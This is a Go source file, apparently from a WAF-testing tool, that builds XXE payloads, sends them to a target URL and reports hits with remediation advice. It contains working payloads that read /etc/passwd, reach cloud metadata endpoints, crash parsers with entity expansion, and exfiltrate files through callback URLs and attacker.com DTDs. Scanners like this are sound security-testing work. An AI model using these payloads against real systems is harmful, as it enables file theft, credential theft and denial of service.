// Package xxe provides XML External Entity (XXE) injection detection and testing.
// It supports detection of XXE vulnerabilities in XML parsers including file disclosure,
// SSRF, denial of service, and out-of-band data exfiltration.
package xxe

import (
	"bytes"
	"context"
	"fmt"
	"net/http"
	"regexp"
	"strings"
	"time"

	"github.com/waftester/waftester/pkg/attackconfig"
	"github.com/waftester/waftester/pkg/defaults"
	"github.com/waftester/waftester/pkg/duration"
	"github.com/waftester/waftester/pkg/finding"
	"github.com/waftester/waftester/pkg/httpclient"
	"github.com/waftester/waftester/pkg/iohelper"
)

// AttackType represents different XXE attack types
type AttackType string

const (
	AttackFileDisclosure  AttackType = "file_disclosure"  // Read local files
	AttackSSRF            AttackType = "ssrf"             // Server-side request forgery
	AttackDoS             AttackType = "dos"              // Billion laughs/Entity expansion
	AttackBlindOOB        AttackType = "blind_oob"        // Out-of-band data exfiltration
	AttackParameterEntity AttackType = "parameter_entity" // Parameter entity injection
	AttackDTDInclusion    AttackType = "dtd_inclusion"    // External DTD inclusion
)

// Payload represents an XXE payload
type Payload struct {
	Name         string           // Payload name
	Type         AttackType       // Attack type
	XML          string           // The XML payload
	Description  string           // Description of the attack
	Severity     finding.Severity // Severity if successful
	Indicators   []string         // Strings to look for in response
	Regex        *regexp.Regexp   // Regex pattern to match
	ExpectedFile string           // File being read (for file disclosure)
}

// Vulnerability represents a detected XXE vulnerability
type Vulnerability struct {
	finding.Vulnerability
	Type    AttackType `json:"type"`
	Payload *Payload   `json:"payload,omitempty"`
}

// DetectorConfig configures the XXE detector
type DetectorConfig struct {
	attackconfig.Base
	Headers         http.Header
	Cookies         []*http.Cookie
	SafeMode        bool   // Avoid destructive payloads
	CallbackURL     string // For OOB testing
	FollowRedirects bool
	ContentType     string // XML content type
}

// DefaultConfig returns a default detector configuration
func DefaultConfig() *DetectorConfig {
	return &DetectorConfig{
		Base: attackconfig.Base{
			Timeout:   duration.HTTPScanning,
			UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
		},
		SafeMode:        true,
		FollowRedirects: false,
		ContentType:     defaults.ContentTypeXML,
	}
}

// Detector performs XXE vulnerability detection
type Detector struct {
	config   *DetectorConfig
	client   *http.Client
	payloads []*Payload
}

// NewDetector creates a new XXE detector
func NewDetector(config *DetectorConfig) *Detector {
	if config == nil {
		config = DefaultConfig()
	}

	client := config.Client
	if client == nil {
		client = httpclient.Default()
	}

	d := &Detector{
		config: config,
		client: client,
	}

	d.payloads = d.generatePayloads()

	return d
}

// generatePayloads creates all XXE payloads
func (d *Detector) generatePayloads() []*Payload {
	var payloads []*Payload

	// File disclosure payloads
	payloads = append(payloads, d.fileDisclosurePayloads()...)

	// SSRF payloads
	payloads = append(payloads, d.ssrfPayloads()...)

	// DoS payloads (only if not safe mode)
	if !d.config.SafeMode {
		payloads = append(payloads, d.dosPayloads()...)
	}

	// Out-of-band payloads (if callback URL provided)
	if d.config.CallbackURL != "" {
		payloads = append(payloads, d.oobPayloads()...)
	}

	// Parameter entity payloads
	payloads = append(payloads, d.parameterEntityPayloads()...)

	// DTD inclusion payloads
	payloads = append(payloads, d.dtdInclusionPayloads()...)

	return payloads
}

func (d *Detector) fileDisclosurePayloads() []*Payload {
	files := []struct {
		path     string
		patterns []string
	}{
		{
			path:     "/etc/passwd",
			patterns: []string{"root:", "nobody:", "daemon:", "/bin/bash", "/bin/sh"},
		},
		{
			path:     "/etc/hostname",
			patterns: []string{},
		},
		{
			path:     "/etc/hosts",
			patterns: []string{"localhost", "127.0.0.1"},
		},
		{
			path:     "C:/Windows/win.ini",
			patterns: []string{"[extensions]", "[fonts]", "[mci extensions]"},
		},
		{
			path:     "/etc/passwd",
			patterns: []string{"root:", "nobody:"},
		},
	}

	// Pre-allocate slice for typical payload count (~40 payloads)
	payloads := make([]*Payload, 0, 40)

	for _, file := range files {
		// Basic XXE file read
		payloads = append(payloads, &Payload{
			Name: fmt.Sprintf("XXE File Read - %s", file.path),
			Type: AttackFileDisclosure,
			XML: fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file://%s">
]>
<root>&xxe;</root>`, file.path),
			Description:  fmt.Sprintf("Attempt to read %s via XXE", file.path),
			Severity:     finding.Critical,
			Indicators:   file.patterns,
			ExpectedFile: file.path,
		})

		// With PHP wrapper
		payloads = append(payloads, &Payload{
			Name: fmt.Sprintf("XXE PHP Filter - %s", file.path),
			Type: AttackFileDisclosure,
			XML: fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=%s">
]>
<root>&xxe;</root>`, file.path),
			Description:  fmt.Sprintf("Attempt to read %s via PHP filter wrapper", file.path),
			Severity:     finding.Critical,
			Regex:        regexp.MustCompile(`[A-Za-z0-9+/=]{20,}`),
			ExpectedFile: file.path,
		})
	}

	// UTF-7 encoded XXE
	payloads = append(payloads, &Payload{
		Name: "XXE UTF-7 Encoded",
		Type: AttackFileDisclosure,
		XML: `<?xml version="1.0" encoding="UTF-7"?>
+ADw-!DOCTYPE foo +AFs-
  +ADw-!ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4-
+AF0-+AD4-
+ADw-root+AD4-+ACY-xxe+ADsAPA-/root+AD4-`,
		Description:  "XXE with UTF-7 encoding to bypass filters",
		Severity:     finding.Critical,
		Indicators:   []string{"root:", "daemon:"},
		ExpectedFile: "/etc/passwd",
	})

	// XXE in attribute
	payloads = append(payloads, &Payload{
		Name: "XXE in Attribute",
		Type: AttackFileDisclosure,
		XML: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root attr="&xxe;"/>`,
		Description:  "XXE entity referenced in attribute",
		Severity:     finding.Critical,
		Indicators:   []string{"root:", "daemon:"},
		ExpectedFile: "/etc/passwd",
	})

	return payloads
}

func (d *Detector) ssrfPayloads() []*Payload {
	targets := []string{
		"http://169.254.169.254/latest/meta-data/",                        // AWS metadata
		"http://metadata.google.internal/computeMetadata/v1/",             // GCP metadata
		"http://169.254.169.254/metadata/instance?api-version=2021-02-01", // Azure metadata
		"http://127.0.0.1:80/",
		"http://localhost:8080/",
		"http://[::1]/",
	}

	// Pre-allocate for SSRF payloads
	payloads := make([]*Payload, 0, len(targets))

	for _, target := range targets {
		payloads = append(payloads, &Payload{
			Name: fmt.Sprintf("XXE SSRF - %s", target),
			Type: AttackSSRF,
			XML: fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "%s">
]>
<root>&xxe;</root>`, target),
			Description: fmt.Sprintf("SSRF via XXE to %s", target),
			Severity:    finding.High,
			Indicators:  []string{"ami-", "instance", "metadata", "compute"},
		})
	}

	return payloads
}

func (d *Detector) dosPayloads() []*Payload {
	return []*Payload{
		// Billion Laughs (Exponential Entity Expansion)
		{
			Name: "Billion Laughs (Small)",
			Type: AttackDoS,
			XML: `<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<lolz>&lol4;</lolz>`,
			Description: "Small billion laughs attack to test entity expansion limits",
			Severity:    finding.High,
		},

		// Quadratic Blowup
		{
			Name: "Quadratic Blowup",
			Type: AttackDoS,
			XML: `<?xml version="1.0"?>
<!DOCTYPE kaboom [
  <!ENTITY a "` + strings.Repeat("a", 50000) + `">
]>
<kaboom>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</kaboom>`,
			Description: "Quadratic blowup attack via large entity repetition",
			Severity:    finding.High,
		},

		// External entity file DoS
		{
			Name: "External Entity DoS",
			Type: AttackDoS,
			XML: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///dev/random">
]>
<foo>&xxe;</foo>`,
			Description: "DoS via reading from /dev/random",
			Severity:    finding.High,
		},
	}
}

func (d *Detector) oobPayloads() []*Payload {
	callbackURL := d.config.CallbackURL

	return []*Payload{
		// Basic OOB XXE
		{
			Name: "OOB XXE HTTP",
			Type: AttackBlindOOB,
			XML: fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "%s?data=xxe">
]>
<root>&xxe;</root>`, callbackURL),
			Description: "Out-of-band XXE via HTTP callback",
			Severity:    finding.Critical,
		},

		// OOB with parameter entity
		{
			Name: "OOB XXE Parameter Entity",
			Type: AttackBlindOOB,
			XML: fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY %%dtd SYSTEM "%s/xxe.dtd">
  %%dtd;
]>
<root>test</root>`, callbackURL),
			Description: "Out-of-band XXE via external DTD",
			Severity:    finding.Critical,
		},

		// OOB data exfiltration
		{
			Name: "OOB Data Exfiltration",
			Type: AttackBlindOOB,
			XML: fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY %%file SYSTEM "file:///etc/passwd">
  <!ENTITY %%eval "<!ENTITY &#x25; exfil SYSTEM '%s?data=%%file;'>">
  %%eval;
  %%exfil;
]>
<root>test</root>`, callbackURL),
			Description: "Blind XXE with data exfiltration via OOB channel",
			Severity:    finding.Critical,
		},

		// FTP OOB (uses callback URL)
		{
			Name: "OOB XXE FTP",
			Type: AttackBlindOOB,
			XML: fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY %%file SYSTEM "file:///etc/passwd">
  <!ENTITY %%dtd SYSTEM "%s/xxe.dtd">
  %%dtd;
]>
<root>test</root>`, callbackURL),
			Description: "Out-of-band XXE via external DTD for FTP",
			Severity:    finding.Critical,
		},
	}
}

func (d *Detector) parameterEntityPayloads() []*Payload {
	return []*Payload{
		{
			Name: "Parameter Entity File Read",
			Type: AttackParameterEntity,
			XML: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  %xxe;
]>
<root>test</root>`,
			Description: "File read via parameter entity",
			Severity:    finding.Critical,
			Indicators:  []string{"root:", "daemon:"},
		},

		{
			Name: "Parameter Entity in Internal Subset",
			Type: AttackParameterEntity,
			XML: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % start "<![CDATA[">
  <!ENTITY % end "]]>">
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY all "%start;%file;%end;">
]>
<root>&all;</root>`,
			Description: "Parameter entity with CDATA wrapper",
			Severity:    finding.Critical,
		},
	}
}

func (d *Detector) dtdInclusionPayloads() []*Payload {
	return []*Payload{
		{
			Name: "External DTD Inclusion HTTP",
			Type: AttackDTDInclusion,
			XML: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo SYSTEM "http://attacker.com/malicious.dtd">
<root>test</root>`,
			Description: "External DTD inclusion via HTTP",
			Severity:    finding.High,
		},

		{
			Name: "External DTD Inclusion File",
			Type: AttackDTDInclusion,
			XML: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo SYSTEM "file:///etc/passwd">
<root>test</root>`,
			Description: "External DTD inclusion via file://",
			Severity:    finding.High,
			Indicators:  []string{"root:", "daemon:"},
		},

		{
			Name: "DOCTYPE ENTITY Subset",
			Type: AttackDTDInclusion,
			XML: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
  %remote;
  %int;
  %send;
]>
<root>test</root>`,
			Description: "Chained external DTD with parameter entities",
			Severity:    finding.Critical,
		},
	}
}

// GetPayloads returns all payloads, optionally filtered by attack type
func (d *Detector) GetPayloads(attackType AttackType) []*Payload {
	if attackType == "" {
		copy := make([]*Payload, len(d.payloads))
		for i, p := range d.payloads {
			pCopy := *p
			copy[i] = &pCopy
		}
		return copy
	}

	// Pre-allocate filtered slice with reasonable capacity
	filtered := make([]*Payload, 0, len(d.payloads)/4)
	for _, p := range d.payloads {
		if p.Type == attackType {
			filtered = append(filtered, p)
		}
	}
	return filtered
}

// Detect tests a URL for XXE vulnerabilities
func (d *Detector) Detect(ctx context.Context, targetURL string, method string) ([]*Vulnerability, error) {
	// Pre-allocate for potential vulnerabilities
	vulns := make([]*Vulnerability, 0, 8)

	for _, payload := range d.payloads {
		select {
		case <-ctx.Done():
			return vulns, ctx.Err()
		default:
		}

		vuln, err := d.testPayload(ctx, targetURL, method, payload)
		if err != nil {
			continue
		}

		if vuln != nil {
			vulns = append(vulns, vuln)
			d.config.NotifyVulnerabilityFound()
		}
	}

	return vulns, nil
}

func (d *Detector) testPayload(ctx context.Context, targetURL, method string, payload *Payload) (*Vulnerability, error) {
	req, err := http.NewRequestWithContext(ctx, method, targetURL, bytes.NewReader([]byte(payload.XML)))
	if err != nil {
		return nil, err
	}

	req.Header.Set("Content-Type", d.config.ContentType)
	req.Header.Set("User-Agent", d.config.UserAgent)

	for key, values := range d.config.Headers {
		for _, v := range values {
			req.Header.Add(key, v)
		}
	}

	for _, cookie := range d.config.Cookies {
		req.AddCookie(cookie)
	}

	start := time.Now()
	resp, err := d.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer iohelper.DrainAndClose(resp.Body)
	elapsed := time.Since(start)

	body, err := iohelper.ReadBodyDefault(resp.Body)
	if err != nil {
		return nil, err
	}
	bodyStr := string(body)

	// Analyze response
	vuln := d.analyzeResponse(targetURL, payload, bodyStr, elapsed)

	return vuln, nil
}

func (d *Detector) analyzeResponse(targetURL string, payload *Payload, body string, elapsed time.Duration) *Vulnerability {
	var evidence string
	var detected bool

	// Check for indicator strings
	for _, indicator := range payload.Indicators {
		if strings.Contains(body, indicator) {
			evidence = indicator
			detected = true
			break
		}
	}

	// Check regex pattern
	if payload.Regex != nil {
		matches := payload.Regex.FindStringSubmatch(body)
		if len(matches) > 0 {
			evidence = matches[0]
			if len(evidence) > 100 {
				evidence = evidence[:100] + "..."
			}
			detected = true
		}
	}

	// Check for common XXE error messages that indicate vulnerability
	xxeErrors := []string{
		"ENTITY", "DOCTYPE", "parser error", "XML parse",
		"SAXParseException", "XMLSyntaxError", "undefined entity",
		"external entity", "file not found", "failed to load",
	}

	for _, errStr := range xxeErrors {
		if strings.Contains(strings.ToLower(body), strings.ToLower(errStr)) {
			if evidence == "" {
				evidence = fmt.Sprintf("XML parser error: %s", errStr)
			}
			detected = true
			break
		}
	}

	if !detected {
		return nil
	}

	return &Vulnerability{
		Vulnerability: finding.Vulnerability{
			Description:  payload.Description,
			Severity:     payload.Severity,
			Evidence:     evidence,
			URL:          targetURL,
			ResponseTime: elapsed,
			Remediation:  getRemediation(payload.Type),
		},
		Type:    payload.Type,
		Payload: payload,
	}
}

func getRemediation(attackType AttackType) string {
	switch attackType {
	case AttackFileDisclosure:
		return "Disable external entity processing. Use defusedxml or similar libraries. Set XMLReader.EntityResolver to null."
	case AttackSSRF:
		return "Disable external entity and DTD processing. Validate and whitelist allowed URLs if external access is needed."
	case AttackDoS:
		return "Limit entity expansion. Set maximum entity depth and count. Use streaming parsers with limits."
	case AttackBlindOOB:
		return "Disable external entities completely. Block outbound connections from XML parser. Monitor for suspicious DNS queries."
	case AttackParameterEntity:
		return "Disable parameter entities. Set XMLReader.ProhibitDtd = true."
	case AttackDTDInclusion:
		return "Disable DTD processing completely. Set LoadExternalDtd = false."
	default:
		return "Disable XML external entity processing. Use secure parser configurations."
	}
}

// GeneratePayload creates a custom XXE payload
func GeneratePayload(attackType AttackType, target string) string {
	switch attackType {
	case AttackFileDisclosure:
		return fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file://%s">
]>
<root>&xxe;</root>`, target)

	case AttackSSRF:
		return fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "%s">
]>
<root>&xxe;</root>`, target)

	case AttackBlindOOB:
		return fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY %%xxe SYSTEM "%s">
  %%xxe;
]>
<root>test</root>`, target)

	default:
		return fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "%s">
]>
<root>&xxe;</root>`, target)
	}
}

// GenerateOOBDTD generates an external DTD file for OOB XXE
func GenerateOOBDTD(callbackURL string, targetFile string) string {
	return fmt.Sprintf(`<!ENTITY %% file SYSTEM "file://%s">
<!ENTITY %% eval "<!ENTITY &#x25; exfiltrate SYSTEM '%s?data=%%file;'>">
%%eval;
%%exfiltrate;`, targetFile, callbackURL)
}

// ContentTypes returns common XML content types to test
func ContentTypes() []string {
	return []string{
		"application/xml",
		"text/xml",
		"application/xhtml+xml",
		"application/soap+xml",
		"application/rss+xml",
		"application/atom+xml",
		"image/svg+xml",
		"application/mathml+xml",
		"application/xslt+xml",
	}
}

// extractDOCTYPEAndEntityRef extracts the DOCTYPE block and the first entity
// reference name from an XXE payload. Returns (doctype, entityRef) where
// entityRef is e.g. "&xxe;" or "%dtd;" depending on the payload.
func extractDOCTYPEAndEntityRef(xxePayload string) (string, string) {
	doctypeStart := strings.Index(xxePayload, "<!DOCTYPE")
	doctypeEnd := strings.Index(xxePayload, "]>")

	var doctype string
	if doctypeStart != -1 && doctypeEnd != -1 {
		doctype = xxePayload[doctypeStart : doctypeEnd+2]
	}

	// Find the entity reference used in the payload body (after ]>)
	entityRef := "&xxe;" // default
	bodyStart := doctypeEnd + 2
	if doctypeEnd != -1 && bodyStart < len(xxePayload) {
		body := xxePayload[bodyStart:]
		// Look for &name; pattern
		ampIdx := strings.Index(body, "&")
		if ampIdx != -1 {
			semiIdx := strings.Index(body[ampIdx:], ";")
			if semiIdx != -1 && semiIdx < 30 {
				entityRef = body[ampIdx : ampIdx+semiIdx+1]
			}
		}
	}

	return doctype, entityRef
}

// WrapInSOAP wraps a payload in a SOAP envelope
func WrapInSOAP(xxePayload string) string {
	doctype, entityRef := extractDOCTYPEAndEntityRef(xxePayload)

	return fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
%s
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <test>%s</test>
  </soap:Body>
</soap:Envelope>`, doctype, entityRef)
}

// WrapInSVG wraps a payload in an SVG image
func WrapInSVG(xxePayload string) string {
	doctype, entityRef := extractDOCTYPEAndEntityRef(xxePayload)

	return fmt.Sprintf(`<?xml version="1.0" standalone="yes"?>
%s
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="10" y="20">%s</text>
</svg>`, doctype, entityRef)
}

// Result represents an XXE scan result
type Result struct {
	URL             string           `json:"url"`
	Vulnerabilities []*Vulnerability `json:"vulnerabilities"`
	PayloadsTested  int              `json:"payloads_tested"`
	Duration        time.Duration    `json:"duration"`
}

// Scan performs a comprehensive XXE scan
func (d *Detector) Scan(ctx context.Context, targetURL string) (*Result, error) {
	start := time.Now()

	result := &Result{
		URL:            targetURL,
		PayloadsTested: len(d.payloads),
	}

	// Test POST method (most common for XML)
	vulns, err := d.Detect(ctx, targetURL, "POST")
	if err != nil {
		return nil, err
	}
	result.Vulnerabilities = vulns

	result.Duration = time.Since(start)

	return result, nil
}

// AllAttackTypes returns all XXE attack types
func AllAttackTypes() []AttackType {
	return []AttackType{
		AttackFileDisclosure,
		AttackSSRF,
		AttackDoS,
		AttackBlindOOB,
		AttackParameterEntity,
		AttackDTDInclusion,
	}
}

// IsXMLEndpoint checks if a URL appears to accept XML
func IsXMLEndpoint(url string) bool {
	xmlIndicators := []string{
		"/xml", "/soap", "/wsdl", "/ws/",
		"/feed", "/rss", "/atom", "/upload",
		".xml", ".svg", ".xsl", ".xslt",
	}

	urlLower := strings.ToLower(url)
	for _, indicator := range xmlIndicators {
		if strings.Contains(urlLower, indicator) {
			return true
		}
	}

	return false
}
